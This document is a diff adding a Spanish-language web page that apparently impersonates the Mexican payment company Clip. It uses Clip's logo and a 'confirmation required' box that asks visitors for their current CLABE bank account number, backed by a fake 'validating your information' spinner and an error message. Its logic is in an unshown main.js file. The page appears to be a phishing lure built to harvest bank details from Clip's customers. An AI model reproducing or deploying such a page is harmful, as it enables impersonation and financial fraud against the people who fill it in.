@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Confirmación CLABE</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f2f2f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 400px;
+      text-align: center;
+      z-index: 1;
+    }
+
+    .container img {
+      width: 40px;
+      margin-bottom: 20px;
+    }
+
+    .container h2 {
+      font-size: 18px;
+      color: #1b1f3b;
+      margin-bottom: 10px;
+    }
+
+    .container p {
+      font-size: 14px;
+      color: #50546c;
+      margin-bottom: 25px;
+      line-height: 1.4;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group input {
+      width: 80%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .btn-confirmar {
+      background-color: #f25822;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 80%;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    #errorMsg {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+      display: none;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(255, 255, 255, 0.8);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 99;
+      backdrop-filter: blur(2px);
+    }
+
+    .spinner-box {
+      text-align: center;
+    }
+
+    .spinner {
+      border: 4px solid #f2f2f3;
+      border-top: 4px solid #f25822;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    .loading-text {
+      font-size: 14px;
+      color: #333;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Chrome, Safari, Edge, Opera */
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+/* Firefox */
+input:focus {
+  outline: none;
+  box-shadow: none;
+}
+
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://assets-global.website-files.com/640a110ff475260ce6551685/640b3788ce1a575625fd9f45_Logo-Clip.svg" alt="Clip Logo">
+    <h2>Confirmación requerida</h2>
+    <p id="mensajeUsuario">#</p>
+
+    <div class="input-group">
+      <input type="text" id="clabe" placeholder="Ingresa tu cuenta CLABE actual*" required inputmode="numeric" pattern="\d*" maxlength="18" />
+    </div>
+
+    <button class="btn-confirmar" onclick="validarClabe()">Confirmar cuenta CLABE</button>
+    <div id="errorMsg">Cuenta CLABE ingresada incorrecta</div>
+  </div>
+
+  <div class="overlay" id="loadingOverlay">
+    <div class="spinner-box">
+      <div class="spinner"></div>
+      <div class="loading-text">Estamos validando tu información.</div>
+    </div>
+  </div>
+
+  <script type="module" src="main.js"></script>
+  </script>
+</body>
+</html>
